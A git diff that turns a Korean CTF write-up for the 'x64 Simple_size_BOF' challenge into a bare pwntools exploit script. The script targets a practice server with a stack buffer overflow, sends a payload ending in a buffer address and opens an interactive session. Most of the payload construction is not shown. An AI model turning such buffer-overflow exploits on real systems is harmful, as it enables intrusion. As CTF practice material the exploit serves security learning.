@@ -1,10 +1,3 @@
-# x64 Simple_size_BOF
-
-매우 기본적인 64bit 환경에서의 BOF 문제이다.   
-<br/>
-
-
-```
 from pwn import *
 
 p = remote('ctf.j0n9hyun.xyz', 3005)
@@ -22,5 +15,3 @@ payload += p64(buf)
 
 p.sendline(payload)
 p.interactive()
-
-```
